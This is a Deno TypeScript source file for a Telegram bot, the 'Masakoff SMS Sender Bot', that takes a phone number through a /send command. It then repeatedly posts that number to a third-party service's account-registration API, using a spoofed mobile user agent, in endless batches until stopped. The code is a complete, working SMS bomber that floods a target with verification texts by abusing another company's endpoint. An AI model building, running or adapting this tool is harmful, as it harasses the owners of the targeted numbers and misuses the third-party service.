// main.ts
// 💥 Masakoff SMS Sender Bot (Deno)
// 🚀 Created by @Masakoff | FlapsterMinerManager
// Sends POST requests in batches of 3 with delays via Telegram webhook
// ✨ /stop stops all running tasks immediately, even during waits

import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";

// --- 🔐 Telegram settings ---
const TOKEN = Deno.env.get("BOT_TOKEN");
if (!TOKEN) throw new Error("❌ BOT_TOKEN env var is required");
const API = `https://api.telegram.org/bot${TOKEN}`;
const SECRET_PATH = "/masakoffvpnhelper";

// --- 👑 Admin username ---
const ADMIN_USERNAME = "Masakoff";

// --- 💬 Helper: send message to Telegram ---
async function sendMessage(chatId: string, text: string, options: any = {}) {
  try {
    const body = { chat_id: chatId, text, ...options };
    await fetch(`${API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
  } catch (e) {
    console.error("sendMessage error ❌", e);
  }
}

// --- 🌐 Helper: send POST request ---
async function sendPostRequest(url: string, headers: Record<string, string>, data: Record<string, any>) {
  try {
    const resp = await fetch(url, {
      method: "POST",
      headers,
      body: JSON.stringify(data),
    });
    return resp.status === 200;
  } catch {
    return false;
  }
}

// --- 🧠 Track all active tasks ---
const activeTasks = new Map<string, { stop: boolean }>();

// --- ⏱ Interruptible sleep helper
// Sleeps up to totalMs but checks `task.stop` every chunkMs and aborts if stop set.
// Returns true if completed full sleep, false if interrupted by stop.
async function sleepInterruptible(totalMs: number, task: { stop: boolean }, chunkMs = 500): Promise<boolean> {
  const start = Date.now();
  while (Date.now() - start < totalMs) {
    if (task.stop) return false;
    const remaining = totalMs - (Date.now() - start);
    await delay(Math.min(chunkMs, remaining));
  }
  return true;
}

// --- 💣 SMS sending logic ---
async function sendSMS(phoneNumber: string, chatId: string) {
  const requestsData = [
    {
      url: "https://api.saray.tm/api/v1/accounts",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.saray.tm",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.12.0"
      },
      data: { phone: `+993${phoneNumber}` }
    }
  ];

  const task = { stop: false };
  activeTasks.set(chatId, task);

  let count = 0;
  await sendMessage(chatId, `📱 Starting SMS sending to +993${phoneNumber} 🔥`);

  while (!task.stop) {
    for (let batch = 0; batch < 3; batch++) {
      if (task.stop) break;
      count++;
      for (const req of requestsData) {
        if (task.stop) break;
        await sendMessage(chatId, `📤 Sending SMS #${count} to +993${phoneNumber}...`);
        const success = await sendPostRequest(req.url, req.headers, req.data);
        await sendMessage(chatId, success ? "✅ Sent successfully!" : "⚠️ Failed to send.");
        // Interruptible 5s between each SMS
        const completed5 = await sleepInterruptible(5000, task, 250);
        if (!completed5) break;
      }
    }

    if (task.stop) break;

    await sendMessage(chatId, "⏳ Batch of 3 SMS completed. Waiting 45 seconds before next batch...");
    // Interruptible 45s pause
    const completed45 = await sleepInterruptible(45000, task, 500);
    if (!completed45) break;
  }

  // cleanup
  activeTasks.delete(chatId);
  await sendMessage(chatId, "⏹ SMS sending stopped. Thank you! 🎉");
}

// --- 🖥️ Webhook Server ---
serve(async (req) => {
  if (req.method !== "POST" || new URL(req.url).pathname !== SECRET_PATH) {
    return new Response("Invalid request ❌", { status: 400 });
  }

  const update = await req.json();

  // Only handle private messages
  if (!update.message || update.message.chat.type !== "private") {
    return new Response("OK");
  }

  const chatId = update.message.chat.id;
  const text = (update.message.text ?? "").trim();
  const username = update.message.from?.username ?? "";

  // --- 🔐 Admin Check ---
  if (username !== ADMIN_USERNAME) {
    await sendMessage(chatId, "🚫 Access denied!\nThis bot is for @Masakoff only 👑");
    return new Response("OK");
  }

  // --- ⚙️ Commands ---
  if (text.startsWith("/start")) {
    await sendMessage(
      chatId,
      "👋 Welcome to the 💥 Masakoff SMS Sender Bot 💥\n\n" +
      "📲 Use:\n" +
      "• /send <number> — start sending SMS\n" +
      "• /stop — stop all sending immediately (no number required) ⛔\n\n" +
      "✨ Created by @Masakoff"
    );
  }

  else if (text.startsWith("/send")) {
    const parts = text.split(" ");
    if (parts.length < 2) {
      await sendMessage(chatId, "⚠️ Please provide a phone number.\nExample: /send 61234567");
    } else {
      const phoneNumber = parts[1].replace(/^\+993/, "");
      await sendMessage(chatId, `🚀 Starting SMS sending to +993${phoneNumber}...`);
      sendSMS(phoneNumber, chatId).catch(console.error);
    }
  }

  else if (text.startsWith("/stop")) {
    // Global stop — no phone number needed
    if (activeTasks.size > 0) {
      for (const task of activeTasks.values()) {
        task.stop = true;
      }
      // Note: tasks will reply to their respective chats that they stopped once they exit,
      // but we also send an immediate confirmation to the admin who invoked /stop.
      await sendMessage(chatId, "🛑 All running SMS tasks have been signalled to stop. They will stop immediately, even if waiting.");
      // clear the map to avoid stale entries (tasks also delete themselves when finishing)
      activeTasks.clear();
    } else {
      await sendMessage(chatId, "ℹ️ No active SMS tasks found to stop.");
    }
  }

  else {
    await sendMessage(chatId, "❓ Unknown command.\nTry /start, /send <number>, or /stop.");
  }

  return new Response("OK");
});





